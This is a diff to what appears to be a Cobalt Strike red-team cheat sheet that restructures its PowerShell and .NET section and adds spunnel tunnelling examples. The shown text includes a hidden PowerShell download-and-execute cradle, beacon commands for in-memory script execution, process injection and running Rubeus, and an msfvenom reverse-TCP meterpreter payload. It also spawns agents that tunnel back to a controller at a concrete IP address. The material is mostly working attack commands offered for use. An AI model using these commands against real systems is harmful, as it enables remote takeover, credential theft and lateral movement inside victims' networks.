@@ -26,7 +26,9 @@ $ powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstri
     * [Custom Payloads](#custom-payloads)
 * [Malleable C2](#malleable-c2)
 * [Files](#files)
-* [Powershell .NET](#powershell-net)
+* [Powershell and .NET](#powershell-and-net)
+    * [Powershell commabds](#powershell-commands)
+    * [.NET remote execution](#net-remote-execution)
 * [Lateral Movement](#lateral-movement)
 * [VPN & Pivots](#vpn--pivots)
 * [Kits](#kits)
@@ -279,7 +281,9 @@ beacon > cancel [*file*]
 beacon > upload [/path/to/file]
 ```
 
-## Powershell .NET
+## Powershell and .NET
+
+### Powershell commands
 
 ```powershell
 # Import a Powershell .ps1 script from the control server and save it in memory in Beacon
@@ -293,8 +297,16 @@ beacon > powerpick [commandlet] [argument]
 
 # Inject Unmanaged Powershell into a specific process and execute the specified command. This is useful for long-running Powershell jobs
 beacon > psinject [pid][arch] [commandlet] [arguments]
+```
 
-# Run a local .NET executable as a Beacon post-exploitation job
+### .NET remote execution
+
+Run a local .NET executable as a Beacon post-exploitation job. 
+
+Require:
+* Binaries compiled with the "Any CPU" configuration.
+
+```powershell
 beacon > execute-assembly [/path/to/script.exe] [arguments]
 beacon > execute-assembly /home/audit/Rubeus.exe
 [*] Tasked beacon to run .NET program: Rubeus.exe
@@ -378,6 +390,14 @@ beacon > browserpivot [pid] [x86|x64]
 
 # Bind to the specified port on the Beacon host, and forward any incoming connections to the forwarded host and port.
 beacon > rportfwd [bind port] [forward host] [forward port]
+
+# spunnel : Spawn an agent and create a reverse port forward tunnel to its controller.    ~=  rportfwd + shspawn.
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw -o /tmp/msf.bin
+beacon> spunnel x64 184.105.181.155 4444 C:\Payloads\msf.bin
+
+# spunnel_local: Spawn an agent and create a reverse port forward, tunnelled through your Cobalt Strike client, to its controller
+# then you can handle the connect back on your MSF multi handler
+beacon> spunnel_local x64 127.0.0.1 4444 C:\Payloads\msf.bin
 ```
 
 ## Kits
